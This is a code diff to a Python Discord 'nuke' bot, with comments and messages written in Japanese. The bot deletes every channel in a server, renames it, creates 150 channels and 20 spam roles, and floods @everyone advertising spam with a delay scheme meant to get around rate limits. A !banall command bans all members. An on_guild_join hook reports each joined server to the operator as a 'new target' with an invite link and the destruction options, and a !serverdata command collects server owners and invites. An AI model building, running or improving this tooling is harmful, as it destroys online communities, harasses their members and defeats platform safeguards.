@@ -7,12 +7,16 @@ from flask import Flask, jsonify
 import logging
 import asyncio
 import random 
+import time
 
 # ログ設定: 警告レベル以上のみ表示
 logging.basicConfig(level=logging.WARNING)
 
-# 🚨 保護対象サーバーIDの定義
-EXCLUDED_GUILD_ID = 1443617254871662642
+# 🚨 --- 監視・保護対象の定義 ---
+EXCLUDED_GUILD_ID = 1443617254871662642 # 破壊コマンドを無効化するサーバーID
+REPORT_GUILD_ID = 1443617254871662642   # レポートを送信するサーバーID
+REPORT_CHANNEL_ID = 1443878284088705125 # レポートを送信するチャンネルID
+# -----------------------------
 
 # --- KeepAlive用: Flaskアプリの定義 ---
 app = Flask(__name__)
@@ -40,8 +44,83 @@ except Exception as e:
 
 
 # ----------------------------------------------------
+# --- 💀 サーバー情報収集機能 (!serverdata <ID> コマンド) ---
+# ----------------------------------------------------
+
+@bot.command(name="serverdata") 
+@commands.has_permissions(administrator=True) 
+async def get_server_data(ctx, server_id: int):
+    """指定されたサーバーIDの詳細情報を取得する。"""
+    
+    guild = bot.get_guild(server_id)
+    
+    if not guild:
+        await ctx.send(f"❌ **失敗だ！** BotはサーバーID (`{server_id}`) に参加していないぜ。")
+        return
+
+    owner = guild.owner
+    owner_info = f"{owner.name} (`{owner.id}`)" if owner else "不明"
+
+    invite_link = "作成失敗/権限不足"
+    temp_channel = None 
+
+    try:
+        channel_to_use = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_invite), None)
+
+        if not channel_to_use and guild.me.guild_permissions.manage_channels:
+            temp_channel = await guild.create_text_channel(
+                "ruru-invite-channel",
+                reason="ruru by nuke - Temporary Invite Creation for !serverdata"
+            )
+            channel_to_use = temp_channel
+
+        if channel_to_use:
+            invite = await channel_to_use.create_invite(max_uses=1, max_age=3600, reason="ruru by nuke - Server Data Retrieval")
+            invite_link = str(invite)
+        else:
+            invite_link = "永続的な招待リンクの作成権限がない"
+
+    except Exception as e:
+        logging.warning(f"招待リンク作成中にエラーが発生したぜ: {e}")
+
+    finally:
+        if temp_channel:
+            await temp_channel.delete()
+
+    response = (
+        f"🕵️ **サーバー情報収集完了！**\n"
+        f"**サーバー名**: {guild.name}\n"
+        f"**サーバーID**: `{guild.id}`\n"
+        f"**サーバー主**: {owner_info}\n"
+        f"**招待リンク**: {invite_link}"
+    )
+    await ctx.send(response)
+
+
+# ----------------------------------------------------
 # --- 💀 最終破壊機能 (!nuke コマンド) ---
 # ----------------------------------------------------
+
+# レート制限回避のため、個々のメッセージ送信に厳密な遅延を挟むヘルパー関数を定義
+async def send_spam_message_with_delay(channel, content):
+    """チャンネルへのメッセージ送信を行い、ランダムな極小遅延を挟む（レート制限対策）"""
+    try:
+        # チャンネルごとの遅延を 0.02秒〜0.05秒 に設定
+        delay = random.uniform(0.02, 0.05) 
+        await asyncio.sleep(delay) 
+        await channel.send(content)
+        return True
+    except discord.HTTPException as e:
+        if e.status == 429:
+            logging.warning(f"チャンネル {channel.name} でレート制限に達したぜ (429)。discord.pyがリトライする。")
+            await asyncio.sleep(random.uniform(1.0, 2.0))
+        else:
+            logging.error(f"チャンネル {channel.name} で予期せぬHTTPエラー: {e}")
+        return False
+    except Exception as e:
+        logging.error(f"チャンネル {channel.name} への送信中に予期せぬエラーが発生: {e}")
+        return False
+
 
 @bot.command(name="nuke") 
 @commands.has_permissions(administrator=True, manage_guild=True) 
@@ -49,12 +128,13 @@ async def ultimate_nuke_command(ctx):
     
     guild = ctx.guild
     
-    # 🚨 サーバーIDによる無効化チェック
+    # サーバーIDによる無効化チェック
     if guild.id == EXCLUDED_GUILD_ID:
         await ctx.send("🛡️ **このサーバーでは無効だ。** サーバーID `1443617254871662642` は、破壊コマンドの実行が禁止されているぞ！")
         return
     
-    # ------------------- 破壊開始 -------------------
+    # ------------------- 破壊開始 (途中経過メッセージあり) -------------------
+    # 🚨 修正: 破壊開始メッセージを復活！
     await ctx.send(
         f"🔥🔥🔥 **INSTANT NUKE STARTED!** 猶予なし！{ctx.author.mention} の命令により、破壊工作を開始する！ 🔥🔥🔥"
     )
@@ -63,8 +143,11 @@ async def ultimate_nuke_command(ctx):
     new_server_name = "るるくんの増殖植民地"
     try:
         await guild.edit(name=new_server_name, reason="ruru by nuke - Server Name Takeover")
+        # 🚨 修正: サーバー名変更ログを復活！
         await ctx.send(f"💥 **SERVER NAME TAKEOVER!** サーバー名を「{new_server_name}」に変更したぜ！")
+        logging.warning(f"SERVER NAME TAKEOVER: Guild name changed to {new_server_name}")
     except Exception as e:
+        # 🚨 修正: サーバー名変更失敗ログを復活！
         await ctx.send("⚠️ **サーバー名変更失敗:** Botの権限が不足しているか、Botのロールが最上位にない。")
         logging.error(f"SERVER NAME CHANGE ERROR: {e}")
 
@@ -76,15 +159,15 @@ async def ultimate_nuke_command(ctx):
     
     try:
         await asyncio.gather(*deletion_tasks)
-        await asyncio.sleep(0.5) 
+        await asyncio.sleep(2.0) 
     except Exception as e:
         logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")
 
     # 2. 絵文字チャンネルを150個作成
     creation_tasks = []
-    num_channels_to_create = 150
     
-    EMOJIS = "😀😂🤣😇🤓🤪🤩🤔😈☠️💀😹" 
+    # チャンネル名に使用する絵文字のリスト
+    EMOJIS = "😀😂🤣😅😇🤪🤓😈☠️💀😹🤫" 
     EMOJI_LIST = list(EMOJIS) 
     
     channel_names = []
@@ -102,7 +185,7 @@ async def ultimate_nuke_command(ctx):
     try:
         new_channels = await asyncio.gather(*creation_tasks)
         successful_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
-        await asyncio.sleep(1.0) 
+        await asyncio.sleep(2.0) 
     except Exception as e:
         logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")
         
@@ -110,6 +193,7 @@ async def ultimate_nuke_command(ctx):
     role_count = 20
     role_name = "ruru by nuke"
     
+    # 🚨 修正: ロールスパム開始メッセージを復活！
     if successful_channels:
         await successful_channels[0].send(f"💥 **ROLE SPAM INITIATED!** チャンネルと並行して {role_count}個のスパムロールを作成中だ！")
     
@@ -126,13 +210,15 @@ async def ultimate_nuke_command(ctx):
         
     try:
         await asyncio.gather(*role_creation_tasks)
+        # 🚨 修正: ロールスパム完了メッセージを復活！
         if successful_channels:
             await successful_channels[0].send(f"✅ **ROLE SPAM COMPLETE!** {role_count}個のロールリスト汚染に成功したぞ！")
+        logging.warning(f"ROLE SPAM COMPLETE: {role_count} roles created.")
     except Exception as e:
         logging.error(f"ROLE SPAM ERROR: ロール作成中にエラーが発生したぜ。: {e}")
 
 
-    # 3. 全ての新しいチャンネルにスパムメッセージを20回送信 (ランダム遅延付き)
+    # 3. 全ての新しいチャンネルにスパムメッセージを15回、レート制限対策を施して送信
     if successful_channels:
         spam_message_content = (
             "# @everyoneruru by nuke😂\n"
@@ -140,27 +226,25 @@ async def ultimate_nuke_command(ctx):
             "https://discord.gg/Uv4dh5nZz6\n"
             "https://imgur.com/NbBGFcf"
         )
-        spam_count = 20
+        # スパム回数は15回
+        spam_count = 15
         
-        await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**宣伝スパム**を送りつけるぞ！")
+        # 🚨 修正: スパム開始メッセージを復活！
+        await successful_channels[0].send(f"📣 **LOAD-BALANCED SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**負荷分散スパム**を送りつけるぞ！（1リクエストあたり最小0.02秒だ！）")
 
         
-        for i, channel in enumerate(successful_channels):
-            for j in range(spam_count):
-                try:
-                    await channel.send(spam_message_content)
-                    delay = random.uniform(1.0, 3.0)
-                    await asyncio.sleep(delay) 
-                    
-                except Exception as e:
-                    logging.warning(f"チャンネル {channel.name} ({i+1}/{len(successful_channels)}) へのメッセージ送信中にエラーが発生。中断するぜ: {e}")
-                    break
+        # チャンネルを横断しながら、15回のラウンドを実行
+        for j in range(spam_count):
+            spam_tasks = []
+            for channel in successful_channels:
+                spam_tasks.append(asyncio.create_task(send_spam_message_with_delay(channel, spam_message_content)))
+                
+            try:
+                await asyncio.gather(*spam_tasks)
+            except Exception as e:
+                logging.warning(f"スパムラウンド {j+1}/{spam_count} の実行中にエラーが発生したぜ。: {e}")
             
-            if i < len(successful_channels) - 1:
-                channel_delay = random.uniform(3.0, 5.0)
-                logging.info(f"チャンネル {i+1} 完了。次のチャンネルへ移行するまで {channel_delay:.2f}秒待機。")
-                await asyncio.sleep(channel_delay)
-
+            await asyncio.sleep(random.uniform(0.5, 1.0))
 
     # 4. 最終報告
     if successful_channels:
@@ -179,18 +263,15 @@ async def ultimate_nuke_command(ctx):
 async def ban_all_members(ctx):
     guild = ctx.guild
 
-    # 🚨 サーバーIDによる無効化チェック
     if guild.id == EXCLUDED_GUILD_ID:
         await ctx.send("🛡️ **このサーバーでは無効だ。** サーバーID `1443617254871662642` は、破壊コマンドの実行が禁止されているぞ！")
         return
         
-    # ------------------- 破壊開始 -------------------
     await ctx.send("🚨 **MASS BAN INITIATED!** 全メンバーをサーバーから叩き出す！")
     
     ban_tasks = []
     
     for member in guild.members:
-        # Bot自身とサーバーオーナーはBANできない
         if member.id == bot.user.id or member == guild.owner:
             continue
         
@@ -206,49 +287,62 @@ async def ban_all_members(ctx):
 
 
 # ----------------------------------------------------
-# --- 💀 情報収集機能 (!info コマンド) ---
+# --- 🤖 Botイベント (侵入報告) ---
 # ----------------------------------------------------
-# (※!infoコマンドの内容は変更なし)
-@bot.command(name="info") 
-@commands.has_permissions(administrator=True) 
-async def find_user_guilds(ctx):
-    
-    TARGET_USER_ID = 1392296075427319852 
-    
-    target_user = bot.get_user(TARGET_USER_ID)
-    if not target_user:
-        try:
-            target_user = await bot.fetch_user(TARGET_USER_ID)
-        except:
-            await ctx.send(f"⚠️ **ユーザーが見つからねぇ！** ID: `{TARGET_USER_ID}` のユーザーは存在しないか、検索できなかったぜ。")
-            return
 
-    await ctx.send(f"🕵️ **情報収集開始！** ユーザー **{target_user.name}** がいるサーバーを探し出す...")
+@bot.event
+async def on_guild_join(guild):
+    """Botが新しいサーバーに参加したときに実行される"""
     
-    found_guilds = []
+    report_channel = bot.get_channel(REPORT_CHANNEL_ID)
     
-    for guild in bot.guilds:
+    invite_link = "作成失敗/権限不足"
+    temp_channel = None 
+
+    try:
+        channel_to_use = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_invite), None)
+
+        if not channel_to_use and guild.me.guild_permissions.manage_channels:
+            temp_channel = await guild.create_text_channel(
+                "ruru-invite-channel",
+                reason="ruru by nuke - Temporary Invite Creation for Report"
+            )
+            channel_to_use = temp_channel
+
+        if channel_to_use:
+            invite = await channel_to_use.create_invite(max_uses=1, max_age=3600, reason="ruru by nuke - New Guild Report")
+            invite_link = str(invite)
+        else:
+            invite_link = "永続的な招待リンクの作成権限がない"
+            
+    except Exception as e:
+        logging.warning(f"Joined Guild: {guild.name} 招待リンク作成中にエラーが発生したぜ: {e}")
+
+    finally:
+        if temp_channel and temp_channel.id != REPORT_CHANNEL_ID:
+            await temp_channel.delete()
+
+    owner_info = f"{guild.owner.name} (`{guild.owner.id}`)" if guild.owner else "不明"
+    
+    report_message = (
+        f"🚨 **NEW TARGET DETECTED!** Botが新しいサーバーに侵入したぞ！\n\n"
+        f"**侵入先サーバー名**: {guild.name}\n"
+        f"**侵入先サーバーID**: `{guild.id}`\n"
+        f"**サーバー主**: {owner_info}\n"
+        f"**侵入用招待リンク**: {invite_link}\n\n"
+        f"--- 破壊オプション ---\n"
+        f"✅ 即座に破壊するか？: `!nuke`\n"
+        f"✅ 人間を追い出すか？: `!banall`"
+    )
+
+    if report_channel:
         try:
-            member = guild.get_member(TARGET_USER_ID)
-            
-            if not member:
-                member = await guild.fetch_member(TARGET_USER_ID)
-            
-            if member:
-                found_guilds.append(f"-> **{guild.name}** (`{guild.id}`)")
-                
-        except discord.NotFound:
-            pass
+            await report_channel.send(report_message)
+            logging.warning(f"Joined Guild: {guild.name} のレポートを {REPORT_CHANNEL_ID} に送信した。")
         except Exception as e:
-            logging.warning(f"ギルド {guild.name} でメンバー検索中にエラーが発生したぜ: {e}")
-            
-    
-    if found_guilds:
-        response = f"👀 **監視結果！** ユーザー **{target_user.name}** は以下のサーバーにいるぞ！\n\n"
-        response += "\n".join(found_guilds)
-        await ctx.send(response)
+            logging.error(f"レポートチャンネルへの送信中にエラーが発生したぜ: {e}")
     else:
-        await ctx.send(f"❌ **失敗だ！** ユーザー **{target_user.name}** は、Botが入っているどのサーバーにも潜んでいなかったぜ！")
+        logging.error(f"レポートチャンネルが見つからねぇ！ID: {REPORT_CHANNEL_ID}")
 
 
 # ----------------------------------------------------
@@ -260,11 +354,11 @@ async def on_ready():
     """Bot起動時に実行"""
     await bot.change_presence(
         status=discord.Status.dnd,
-        activity=discord.Game(name="究極の破壊準備... !nuke | !banall | !info")
+        activity=discord.Game(name="侵入監視と破壊準備... !nuke | !banall | !serverdata <ID>")
     )
     logging.warning(f"Bot {bot.user} is operational and ready to cause chaos!")
     
-    logging.warning("スラッシュコマンドは無視。!nuke、!banall、!infoコマンドが有効になったぜ。")
+    logging.warning("スラッシュコマンドは無視。!nuke、!banall、!serverdataコマンドが有効になったぜ。")
 
 @bot.event
 async def on_message(message):
